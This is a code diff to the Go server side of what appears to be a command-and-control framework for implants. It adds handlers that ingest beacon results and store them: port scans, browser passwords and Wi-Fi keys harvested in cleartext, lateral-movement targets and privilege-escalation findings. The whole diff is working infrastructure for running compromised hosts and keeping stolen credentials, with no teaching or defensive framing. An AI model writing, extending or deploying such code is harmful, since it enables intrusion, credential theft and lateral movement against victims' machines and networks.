@@ -3,9 +3,11 @@ package server
 import (
 	"context"
 	"encoding/base64"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"log/slog"
+	"net"
 	"strconv"
 	"strings"
 	"time"
@@ -78,6 +80,380 @@ func decodeTaskResult(taskType, encoding, output string) string {
 		}
 	}
 	return output
+}
+
+// applyStructuredTaskResult preserves the recon/collection side effects that
+// used to be reachable only through forgeable operator callbacks. The caller
+// has already authenticated the beacon, matched the task to its agent, claimed
+// a live task and persisted the final result exactly once.
+func (s *Server) applyStructuredTaskResult(agent db.Implant, task db.Task, r taskResult, now time.Time) {
+	if task.Status != "completed" || r.Type != task.Type {
+		return
+	}
+	switch task.Type {
+	case "portscan":
+		s.ingestPortscanResult(agent, task, now)
+	case "browser_steal":
+		s.ingestBrowserCredentialResult(agent, task)
+	case "wifi_creds":
+		s.ingestWifiCredentialResult(agent, task)
+	case "lateral":
+		s.ingestLateralHostResult(task, now)
+	}
+}
+
+func formatPrivescStructuredResult(result string) string {
+	trimmed := strings.TrimSpace(result)
+	if !strings.HasPrefix(trimmed, "{") {
+		return result
+	}
+	var fields map[string]json.RawMessage
+	if err := json.Unmarshal([]byte(trimmed), &fields); err != nil {
+		return result
+	}
+	if _, ok := fields["os"]; !ok {
+		if _, vulns := fields["vulnerabilities"]; !vulns {
+			if _, misconfigs := fields["misconfigurations"]; !misconfigs {
+				if _, suggestions := fields["suggestions"]; !suggestions {
+					return result
+				}
+			}
+		}
+	}
+	var payload struct {
+		OS              string `json:"os"`
+		Vulnerabilities []struct {
+			CVE         string `json:"cve"`
+			Title       string `json:"title"`
+			Description string `json:"description"`
+			Severity    string `json:"severity"`
+		} `json:"vulnerabilities"`
+		Misconfigurations []struct {
+			Title       string `json:"title"`
+			Description string `json:"description"`
+			Severity    string `json:"severity"`
+		} `json:"misconfigurations"`
+		Suggestions []string `json:"suggestions"`
+	}
+	if err := json.Unmarshal([]byte(trimmed), &payload); err != nil {
+		return result
+	}
+
+	var out strings.Builder
+	out.WriteString("=== Privilege Escalation Check Results ===\n\n")
+	fmt.Fprintf(&out, "OS: %s\n\n", payload.OS)
+	fmt.Fprintf(&out, "Found %d potential vulnerabilities:\n", len(payload.Vulnerabilities))
+	for i, vuln := range payload.Vulnerabilities {
+		fmt.Fprintf(&out, "%d. [%s] %s - %s (CVE: %s)\n", i+1, vuln.Severity, vuln.Title, vuln.Description, vuln.CVE)
+	}
+	fmt.Fprintf(&out, "\nFound %d misconfigurations:\n", len(payload.Misconfigurations))
+	for i, misconfig := range payload.Misconfigurations {
+		fmt.Fprintf(&out, "%d. [%s] %s - %s\n", i+1, misconfig.Severity, misconfig.Title, misconfig.Description)
+	}
+	out.WriteString("\nSuggestions:\n")
+	for i, suggestion := range payload.Suggestions {
+		fmt.Fprintf(&out, "%d. %s\n", i+1, suggestion)
+	}
+	return out.String()
+}
+
+func (s *Server) ingestPortscanResult(agent db.Implant, task db.Task, now time.Time) {
+	protocolName := strings.ToLower(strings.TrimSpace(task.Shell))
+	if protocolName != "udp" {
+		protocolName = "tcp"
+	}
+	target := ""
+	allowedTargets := make(map[string]struct{})
+	if parts := strings.SplitN(task.Command, ":", 2); len(parts) == 2 {
+		for _, candidate := range strings.Split(parts[0], ",") {
+			candidate = strings.TrimSpace(candidate)
+			if candidate != "" {
+				allowedTargets[candidate] = struct{}{}
+			}
+		}
+		if len(allowedTargets) == 1 {
+			for candidate := range allowedTargets {
+				target = candidate
+			}
+		}
+	}
+
+	var rows []db.ScanResult
+	seen := make(map[string]struct{})
+	addRow := func(targetIP string, port int, protocol, state string) {
+		if port < 1 || port > 65535 || protocol == "" || state == "" {
+			return
+		}
+		key := fmt.Sprintf("%s\x00%d\x00%s", targetIP, port, protocol)
+		if _, ok := seen[key]; ok {
+			return
+		}
+		seen[key] = struct{}{}
+		rows = append(rows, db.ScanResult{
+			AgentID: agent.ID, TaskID: task.ID, TargetIP: targetIP,
+			Port: port, Protocol: protocol, State: state, CreatedAt: now,
+		})
+	}
+
+	trimmed := strings.TrimSpace(task.Result)
+	if strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[") {
+		var payload struct {
+			Results []string `json:"results"`
+		}
+		if err := json.Unmarshal([]byte(trimmed), &payload); err != nil {
+			var list []string
+			if err := json.Unmarshal([]byte(trimmed), &list); err != nil {
+				return
+			}
+			payload.Results = list
+		}
+		for _, raw := range payload.Results {
+			parts := strings.Split(raw, ":")
+			if len(parts) < 3 {
+				continue
+			}
+			port, err := strconv.Atoi(strings.TrimSpace(parts[0]))
+			if err != nil {
+				continue
+			}
+			row := db.ScanResult{
+				AgentID: agent.ID, TaskID: task.ID, TargetIP: target,
+				Port: port, Protocol: strings.TrimSpace(parts[1]), State: strings.TrimSpace(parts[2]), CreatedAt: now,
+			}
+			if len(parts) > 3 {
+				row.Service = parts[3]
+			}
+			if len(parts) > 4 {
+				row.Version = parts[4]
+			}
+			if len(parts) > 5 {
+				row.Banner = strings.Join(parts[5:], ":")
+			}
+			if row.Port < 1 || row.Port > 65535 || row.Protocol == "" || row.State == "" {
+				continue
+			}
+			key := fmt.Sprintf("%s\x00%d\x00%s", row.TargetIP, row.Port, row.Protocol)
+			if _, ok := seen[key]; ok {
+				continue
+			}
+			seen[key] = struct{}{}
+			rows = append(rows, row)
+		}
+	} else {
+		for _, line := range strings.Split(task.Result, "\n") {
+			fields := strings.Fields(strings.TrimSpace(line))
+			if len(fields) < 2 {
+				continue
+			}
+			host, portText, err := net.SplitHostPort(fields[0])
+			if err != nil {
+				continue
+			}
+			if _, ok := allowedTargets[host]; !ok {
+				continue
+			}
+			port, err := strconv.Atoi(portText)
+			if err != nil {
+				continue
+			}
+			state := strings.ToLower(fields[1])
+			if state != "open" && state != "closed" {
+				continue
+			}
+			addRow(host, port, protocolName, state)
+		}
+	}
+	if len(rows) == 0 {
+		return
+	}
+	if err := s.db.CreateInBatches(rows, 500).Error; err != nil {
+		slog.Error("Failed to persist beacon scan results", "agent_id", agent.ID, "task_id", task.ID, "error", err)
+	}
+}
+
+func browserCredentialNotes(result string) []string {
+	trimmed := strings.TrimSpace(result)
+	if strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[") {
+		var payload struct {
+			Credentials []string `json:"credentials"`
+		}
+		if err := json.Unmarshal([]byte(trimmed), &payload); err == nil && payload.Credentials != nil {
+			return payload.Credentials
+		}
+		var list []string
+		if err := json.Unmarshal([]byte(trimmed), &list); err == nil {
+			return list
+		}
+		return nil
+	}
+
+	var notes []string
+	var url, username, password string
+	flush := func() {
+		if url != "" && username != "" {
+			notes = append(notes, strings.Join([]string{"browser", url, username, password, ""}, "|"))
+		}
+		url, username, password = "", "", ""
+	}
+	for _, line := range strings.Split(result, "\n") {
+		trimmed := strings.TrimSpace(line)
+		lower := strings.ToLower(trimmed)
+		switch {
+		case strings.HasPrefix(lower, "url:"):
+			url = strings.TrimSpace(trimmed[len("url:"):])
+		case strings.HasPrefix(lower, "user:"):
+			username = strings.TrimSpace(trimmed[len("user:"):])
+		case strings.HasPrefix(lower, "pass:"):
+			password = strings.TrimSpace(trimmed[len("pass:"):])
+		case trimmed == "---":
+			flush()
+		case strings.HasPrefix(lower, "browser|") && strings.Count(trimmed, "|") >= 3:
+			notes = append(notes, trimmed)
+		}
+	}
+	flush()
+	return notes
+}
+
+func wifiCredentialPairs(result string) [][2]string {
+	trimmed := strings.TrimSpace(result)
+	if strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[") {
+		var payload struct {
+			Networks []string `json:"networks"`
+		}
+		if err := json.Unmarshal([]byte(trimmed), &payload); err == nil && payload.Networks != nil {
+			return parseWifiNetworkStrings(payload.Networks)
+		}
+		var list []string
+		if err := json.Unmarshal([]byte(trimmed), &list); err == nil {
+			return parseWifiNetworkStrings(list)
+		}
+		return nil
+	}
+
+	var pairs [][2]string
+	var ssid string
+	for _, line := range strings.Split(result, "\n") {
+		trimmed := strings.TrimSpace(line)
+		if strings.HasPrefix(trimmed, "--- Profile: ") && strings.HasSuffix(trimmed, " ---") {
+			ssid = strings.TrimSpace(strings.TrimSuffix(strings.TrimPrefix(trimmed, "--- Profile: "), " ---"))
+			continue
+		}
+		lower := strings.ToLower(trimmed)
+		if ssid != "" && (strings.Contains(lower, "key content") || strings.Contains(trimmed, "关键内容")) {
+			if separator := strings.IndexAny(trimmed, ":："); separator >= 0 {
+				password := strings.TrimSpace(trimmed[separator+1:])
+				if password != "" {
+					pairs = append(pairs, [2]string{ssid, password})
+				}
+			}
+			ssid = ""
+			continue
+		}
+		if strings.Contains(trimmed, "[NetworkManager]") {
+			if start := strings.Index(trimmed, "SSID:"); start >= 0 {
+				rest := trimmed[start+len("SSID:"):]
+				if separator := strings.Index(rest, ", PSK:"); separator >= 0 {
+					ssid = strings.TrimSpace(rest[:separator])
+					password := strings.TrimSpace(rest[separator+len(", PSK:"):])
+					if ssid != "" && password != "" {
+						pairs = append(pairs, [2]string{ssid, password})
+					}
+				}
+			}
+		}
+	}
+	return pairs
+}
+
+func parseWifiNetworkStrings(networks []string) [][2]string {
+	pairs := make([][2]string, 0, len(networks))
+	for _, network := range networks {
+		parts := strings.SplitN(network, ":", 2)
+		if len(parts) != 2 {
+			continue
+		}
+		ssid := strings.TrimSpace(parts[0])
+		if ssid == "" {
+			continue
+		}
+		pairs = append(pairs, [2]string{ssid, strings.TrimSpace(parts[1])})
+	}
+	return pairs
+}
+
+func (s *Server) ingestBrowserCredentialResult(agent db.Implant, task db.Task) {
+	entries := make([]db.CredentialEntry, 0)
+	for _, note := range browserCredentialNotes(task.Result) {
+		encrypted, err := encryptCredNotes(note)
+		if err != nil {
+			s.vaultNoteError("encrypt-browser-notes", err, task.ID, agent.ID)
+			continue
+		}
+		entries = append(entries, db.CredentialEntry{
+			AgentID: agent.ID, Source: "browser", Type: "cleartext",
+			TaskID: task.ID, Notes: encrypted, TenantID: agent.TenantID,
+		})
+	}
+	s.storeHarvestedCredentialEntries(agent.ID, task.ID, "browser", entries)
+}
+
+func (s *Server) ingestWifiCredentialResult(agent db.Implant, task db.Task) {
+	entries := make([]db.CredentialEntry, 0)
+	for _, pair := range wifiCredentialPairs(task.Result) {
+		entries = append(entries, db.CredentialEntry{
+			AgentID: agent.ID, Username: pair[0], Password: pair[1],
+			Source: "wifi", Type: "cleartext", TaskID: task.ID, TenantID: agent.TenantID,
+		})
+	}
+	s.storeHarvestedCredentialEntries(agent.ID, task.ID, "wifi", entries)
+}
+
+func (s *Server) storeHarvestedCredentialEntries(agentID string, taskID uint, source string, entries []db.CredentialEntry) int {
+	if len(entries) == 0 {
+		return 0
+	}
+	created := 0
+	if err := s.db.Transaction(func(tx *gorm.DB) error {
+		for i := range entries {
+			// A nested transaction isolates a rejected row (for example a vault
+			// crypto failure) without aborting the whole PostgreSQL transaction.
+			if err := tx.Transaction(func(rowTx *gorm.DB) error {
+				return rowTx.Create(&entries[i]).Error
+			}); err != nil {
+				slog.Warn("Harvested credential dropped", "source", source, "agent_id", agentID, "task_id", taskID, "error", err)
+				continue
+			}
+			created++
+		}
+		return nil
+	}); err != nil {
+		slog.Warn("Harvested credential transaction aborted", "source", source, "agent_id", agentID, "task_id", taskID, "error", err)
+	}
+	return created
+}
+
+func (s *Server) ingestLateralHostResult(task db.Task, now time.Time) {
+	command, _, err := taskWireArgs(task)
+	if err != nil {
+		slog.Error("Failed to resolve lateral result arguments", "task_id", task.ID, "error", err)
+		return
+	}
+	method, target := canonicalLateralMethodTarget(command)
+	if method == "" || target == "" {
+		return
+	}
+	services, err := json.Marshal([]map[string]interface{}{{"method": method, "port": 0}})
+	if err != nil {
+		slog.Error("Failed to encode lateral host service", "task_id", task.ID, "error", err)
+		return
+	}
+	host := db.NetworkHost{AgentID: task.AgentID, IP: target}
+	if err := s.db.Where("agent_id = ? AND ip = ?", task.AgentID, target).
+		Assign(db.NetworkHost{Services: string(services), LastSeen: now}).
+		FirstOrCreate(&host, db.NetworkHost{AgentID: task.AgentID, IP: target}).Error; err != nil {
+		slog.Error("Failed to persist lateral network host", "agent_id", task.AgentID, "task_id", task.ID, "error", err)
+	}
 }
 
 func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid string, now time.Time) {
@@ -407,6 +783,9 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		if r.Type == "token_list_procs" && task.Result != "" {
 			task.Result = FormatTokenProcsFromJSON(task.Result)
 		}
+		if r.Type == task.Type && task.Type == "privesc_check" && task.Result != "" {
+			task.Result = formatPrivescStructuredResult(task.Result)
+		}
 
 		// When set_sleep succeeds, update agent's current interval/jitter
 		if r.Type == "set_sleep" && task.Status == "completed" {
@@ -526,7 +905,7 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			task.Status = "failed"
 		}
 		if err := s.withBusyRetryDB("result", func() *gorm.DB {
-			return s.db.Model(task).Updates(map[string]interface{}{
+			return s.db.Model(&db.Task{}).Where("id = ?", task.ID).Updates(map[string]interface{}{
 				"status":          task.Status,
 				"result":          dbTask.Result,
 				"error":           dbTask.Error,
@@ -539,6 +918,8 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			})
 		}).Error; err != nil {
 			slog.Error("Failed to save task result", "task_id", task.ID, "agent_id", uuid, "type", r.Type, "error", err)
+		} else if task.Status == "completed" && r.Type == task.Type {
+			s.applyStructuredTaskResult(agent, *task, r, now)
 		}
 		if !isSilent {
 			s.broadcastTaskUpdate(uuid, *task)
